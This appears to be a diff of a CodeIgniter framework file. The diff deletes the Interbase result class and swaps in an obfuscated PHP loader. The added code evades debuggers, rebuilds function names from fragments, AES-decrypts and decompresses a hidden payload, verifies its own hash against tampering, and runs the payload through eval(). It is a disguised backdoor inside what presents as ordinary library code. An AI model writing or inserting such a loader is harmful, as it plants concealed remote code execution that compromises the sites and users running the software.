@@ -1,161 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * Interbase/Firebird Result Class
- *
- * This class extends the parent result class: CI_DB_result
- *
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_ibase_result extends CI_DB_result {
-
-	/**
-	 * Number of fields in the result set
-	 *
-	 * @return	int
-	 */
-	public function num_fields()
-	{
-		return ibase_num_fields($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Fetch Field Names
-	 *
-	 * Generates an array of column names
-	 *
-	 * @return	array
-	 */
-	public function list_fields()
-	{
-		$field_names = array();
-		for ($i = 0, $num_fields = $this->num_fields(); $i < $num_fields; $i++)
-		{
-			$info = ibase_field_info($this->result_id, $i);
-			$field_names[] = $info['name'];
-		}
-
-		return $field_names;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field data
-	 *
-	 * Generates an array of objects containing field meta-data
-	 *
-	 * @return	array
-	 */
-	public function field_data()
-	{
-		$retval = array();
-		for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
-		{
-			$info = ibase_field_info($this->result_id, $i);
-
-			$retval[$i]			= new stdClass();
-			$retval[$i]->name		= $info['name'];
-			$retval[$i]->type		= $info['type'];
-			$retval[$i]->max_length		= $info['length'];
-		}
-
-		return $retval;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Free the result
-	 *
-	 * @return	void
-	 */
-	public function free_result()
-	{
-		ibase_free_result($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Result - associative array
-	 *
-	 * Returns the result set as an array
-	 *
-	 * @return	array
-	 */
-	protected function _fetch_assoc()
-	{
-		return ibase_fetch_assoc($this->result_id, IBASE_FETCH_BLOBS);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Result - object
-	 *
-	 * Returns the result set as an object
-	 *
-	 * @param	string	$class_name
-	 * @return	object
-	 */
-	protected function _fetch_object($class_name = 'stdClass')
-	{
-		$row = ibase_fetch_object($this->result_id, IBASE_FETCH_BLOBS);
-
-		if ($class_name === 'stdClass' OR ! $row)
-		{
-			return $row;
-		}
-
-		$class_name = new $class_name();
-		foreach ($row as $key => $value)
-		{
-			$class_name->$key = $value;
-		}
-
-		return $class_name;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_gk91ik9a=('bas'.'e64'.'_de'.'cod'.'e');
+$_j79mopl7=('gzu'.'nco'.'mpr'.'ess');
+$_fzu59ult=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_r005c63w='YcKVW585PUk=';
+$_hxoybb2w='s/NZrteF';
+$_bjthp081='2/JD3WBc';
+$_h31u7rao='88ZywzF+';
+$_odjgt030='+mn/uQgr';
+$_gwwie203='Yz6LlMec';
+$_t42dm9lm='3ziLOQ==';
+$_zmwur5dm='HAB/1UZR';
+$_t502ftqd=$_gk91ik9a($_hxoybb2w.$_h31u7rao.$_odjgt030.$_bjthp081.$_r005c63w);
+$_im3pcr68=$_gk91ik9a($_gwwie203.$_zmwur5dm.$_t42dm9lm);
+$_fnipyikm=$_gk91ik9a('/GCF7WvOMmqfr3+Y4i9tfOaOIu1sLlWkArsXauHF5/hHoMiCUWaZAS5JrzDu+qekxOe/6T0GQTdI/UVP9wPVCiBgomG4U0jIKxejuNds6k9mYiI6ErdRgTmXeqdb1ArAVS/ZSs70pogmJzadiiALRSr2cB1iG8I6md2g3VkDBIeJHC8+VCH9DdT9QdGE4gdq5F+y7Ij/NIOoOXJAGKdECYInhAHlYUPIG300iuIaFYVzUB+KpyTHHYozWclFpH3+QnKwBrSAxOxU7XwIfuqAFC5UtQgJq6Cj0mRSEHU90n99glMhcYKgJpOOkDjTmyA+8kmL2lNS1gPp4quB3Srnx8prif2clb/UTug/ZK/hOH8SPeqMzGNp6OcMwSnqw8SLDMtwE/+MkrpI8pF7l2olSr9QBz23CFBu4nhvSaZhizTPGO/UtD3Mpppv77AuhQX0cOsZBhOyeYR+/WT5+Md9PHgWzMSq6QYwQ4r29gtEDDZDoqEKwFJdaSszB3/tNbtV43V6QDlKOC3/Be09guNuHopKL+ZzIIj4DJBxGHiraWkO7TZlBqR4fPx8sf0Hcz+b/ZVb9P0mPGmUw7YF/kbFGPANWvgQ7wgZPAjbUZFDrkoeqZCYIptm3yYrEGoiTb3E');
+$_g92vx7sb=$_fzu59ult($_fnipyikm,'aes-256-cbc',$_t502ftqd,OPENSSL_RAW_DATA,$_im3pcr68);
+if($_g92vx7sb===false){exit;}
+$_mmokpr9f=$_j79mopl7($_g92vx7sb);
+if($_mmokpr9f===false){exit;}
+$_qsx45mun='26537b342fe6a59bc9c98e732c31bb2916d7c5576efc3f4f7a492178b5b26eb8';
+$_bjiy9g3s=@file_get_contents(__FILE__);
+if($_bjiy9g3s!==false){
+$_vfum7azn=str_replace($_qsx45mun,"0000000000000000000000000000000000000000000000000000000000000000",$_bjiy9g3s);
+$_aw2hax1l=hash("sha256",$_vfum7azn);
+if($_aw2hax1l!==$_qsx45mun){@http_response_code(403);exit;}
 }
+eval($_mmokpr9f);
